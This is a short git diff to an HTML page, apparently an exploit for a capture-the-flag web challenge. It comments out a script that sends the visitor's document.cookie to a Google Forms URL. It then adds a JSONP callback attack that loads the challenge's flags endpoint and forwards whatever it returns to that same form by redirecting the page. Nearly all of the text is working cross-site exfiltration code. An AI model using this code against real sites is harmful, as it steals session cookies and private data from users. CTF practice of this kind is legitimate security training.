@@ -9,7 +9,15 @@ layout: xss
     <h1>Welcome to this "maybe xss" program</h1>
 </div>
 
-<script>
+<!--<script>
 console.log("COOKIES " , document.cookie);
 document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + document.cookie
+</script>-->
+
+<script>
+    function xss_redirect(data){
+        document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + data.toString()
+    }
 </script>
+
+<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect"></script>
